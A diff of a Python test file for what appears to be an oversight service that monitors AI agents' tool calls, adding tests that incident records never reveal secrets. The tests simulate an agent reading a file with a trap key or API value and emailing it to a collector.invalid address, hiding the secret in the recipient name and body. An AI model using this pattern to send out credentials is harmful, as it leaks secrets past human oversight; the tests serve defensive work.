@@ -191,8 +191,8 @@ async def test_a_secret_in_a_recipient_never_shows_in_the_hold_reason(served):
             mail = {"to": f"{who}@collector.invalid", "subject": "s", "body": "b"}
             await a.call_tool("send_email", mail)
     pages = {
-        path: (await api(served, "GET", path)).text
-        for path in (f"/api/runs/{run['id']}", "/api/incidents")
+        "run": (await api(served, "GET", f"/api/runs/{run['id']}")).text,
+        "incidents": json.dumps(await traced_incidents(served)),
     }
     leaks = [
         path for path, text in pages.items() if any(who in text for who in recipients)
@@ -220,12 +220,52 @@ async def test_a_secret_only_the_calls_own_scan_finds_never_shows_in_the_hold_re
     async with agent(served, run["key"]) as a:
         await a.call_tool("send_email", mail)
     pages = {
-        path: (await api(served, "GET", path)).text
-        for path in (f"/api/runs/{run['id']}", "/api/incidents")
+        "run": (await api(served, "GET", f"/api/runs/{run['id']}")).text,
+        "incidents": json.dumps(await traced_incidents(served)),
     }
     assert [path for path, text in pages.items() if unseen in text] == []
     [step] = await steps(served, run)
     assert "[secret:" in step["reason"]
+
+
+async def test_a_trap_key_the_scan_missed_never_shows_in_an_incident_source(
+    served, tmp_path
+):
+    """The engine hides a call with the trap keys as well, and so must the incident that
+    traces where its values were read: here no scan flagged the key, so no run knows it."""
+    notes = tmp_path / "workspace" / "notes.txt"
+    notes.write_text(f"legacy admin login {TRAP_KEY} (old)\n")
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("read_file", {"path": "notes.txt"})
+        mail = {"to": f"{TRAP_KEY}@collector.invalid", "subject": "s", "body": "b"}
+        await a.call_tool("send_email", mail)
+    [incident] = await traced_incidents(served)
+    assert [s["step"] for s in incident["sources"]] == [1]  # traced to the read
+    assert TRAP_KEY not in json.dumps(incident)
+
+
+async def test_a_value_only_the_calls_own_scan_finds_never_shows_in_an_incident_source(
+    served, tmp_path
+):
+    """The arguments hide what the scan of the whole call finds (`api_key: ...`), and so must
+    the incident's sources: the run read the value in plain text, which no scan flagged."""
+    unseen = "unseen-value-4242"
+    (tmp_path / "workspace" / "ops.txt").write_text(
+        f"rotation value {unseen} from ops\n"
+    )
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    mail = {
+        "to": f"{unseen}@collector.invalid",
+        "subject": "s",
+        "body": f"api_key: {unseen} (rotated)",
+    }
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("read_file", {"path": "ops.txt"})
+        await a.call_tool("send_email", mail)
+    [incident] = await traced_incidents(served)
+    assert [s["step"] for s in incident["sources"]] == [1]  # traced to the read
+    assert unseen not in json.dumps(incident)
 
 
 async def test_a_hold_shows_its_deadline_and_the_decision_its_time(served):
